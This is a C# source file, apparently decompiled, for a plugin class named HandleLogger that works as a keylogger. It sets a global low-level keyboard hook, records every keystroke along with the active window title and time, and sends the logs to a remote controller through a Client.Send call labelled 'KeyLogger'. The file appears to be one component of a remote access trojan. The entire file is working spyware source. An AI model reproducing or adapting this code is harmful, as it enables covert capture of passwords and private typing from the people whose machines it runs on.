using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public static class HandleLogger
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WM_KEYDOWN = 256;

	private static readonly LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	private static readonly int WHKEYBOARDLL = 13;

	private static string CurrentActiveWindowTitle;

	public static void Run()
	{
		_hookID = SetHook(_proc);
		Application.Run((Form)(object)new ClipboardNotification());
	}

	public static void Exit()
	{
		UnhookWindowsHookEx(_hookID);
		GC.Collect();
		Application.Exit();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		try
		{
			using Process process = Process.GetCurrentProcess();
			using ProcessModule processModule = process.MainModule;
			return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(processModule.ModuleName), 0u);
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
			return IntPtr.Zero;
		}
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				int num = Marshal.ReadInt32(lParam);
				bool num2 = (GetKeyState(20) & 0xFFFF) != 0;
				bool flag = ((uint)GetKeyState(160) & 0x8000u) != 0 || (GetKeyState(161) & 0x8000) != 0;
				string text = KeyboardLayout((uint)num);
				text = ((!(num2 || flag)) ? text.ToLower() : text.ToUpper());
				Keys val;
				if (num >= 112 && num <= 135)
				{
					val = (Keys)num;
					text = "[" + ((object)(Keys)(ref val)).ToString() + "]";
				}
				else
				{
					val = (Keys)num;
					switch (((object)(Keys)(ref val)).ToString())
					{
					case "Space":
						text = " ";
						break;
					case "Return":
						text = "[ENTER]\n";
						break;
					case "Escape":
						text = "[ESC]\n";
						break;
					case "Back":
						text = "[Back]";
						break;
					case "Tab":
						text = "[Tab]\n";
						break;
					}
				}
				if (!string.IsNullOrEmpty(text))
				{
					StringBuilder stringBuilder = new StringBuilder();
					if (CurrentActiveWindowTitle == GetActiveWindowTitle())
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.Append(Environment.NewLine);
						stringBuilder.Append(Environment.NewLine);
						stringBuilder.Append("###  " + GetActiveWindowTitle() + " | " + DateTime.Now.ToShortTimeString() + " ###");
						stringBuilder.Append(Environment.NewLine);
						stringBuilder.Append(text);
					}
					Client.Send(LEB128.Write(new object[3]
					{
						"KeyLogger",
						"Log",
						stringBuilder.ToString()
					}));
				}
			}
			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}
		catch
		{
			return IntPtr.Zero;
		}
	}

	private static string KeyboardLayout(uint vkCode)
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] lpKeyState = new byte[256];
			if (!GetKeyboardState(lpKeyState))
			{
				return "";
			}
			uint wScanCode = MapVirtualKey(vkCode, 0u);
			uint lpdwProcessId;
			IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out lpdwProcessId));
			ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, keyboardLayout);
			return stringBuilder.ToString();
		}
		catch
		{
		}
		Keys val = (Keys)vkCode;
		return ((object)(Keys)(ref val)).ToString();
	}

	private static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = GetForegroundWindow();
			GetWindowThreadProcessId(foregroundWindow, out var _);
			if (GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
			{
				CurrentActiveWindowTitle = stringBuilder.ToString();
				return CurrentActiveWindowTitle;
			}
		}
		catch (Exception)
		{
		}
		return "???";
	}

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern short GetKeyState(int keyCode);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);
}
